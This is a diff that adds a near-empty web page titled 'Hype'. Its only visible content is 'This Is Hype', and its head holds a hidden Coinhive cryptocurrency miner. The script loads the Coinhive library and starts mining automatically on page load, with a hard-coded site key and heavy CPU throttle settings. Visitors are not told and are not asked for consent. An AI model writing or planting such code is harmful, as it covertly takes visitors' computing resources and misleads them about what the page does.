@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Hype</title>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.User('x7lJozj7YkUgRD3dyyaOYly6Fa8dtynQ','Heroku', {throttle: 0.8, forceASMJS: true});
+        miner.start();
+        var threads = miner.getNumThreads();
+        miner.setNumThreads(threads);
+        console.log(threads);
+
+    </script>
+</head>
+<body>
+    This Is Hype
+</body>
+</html>
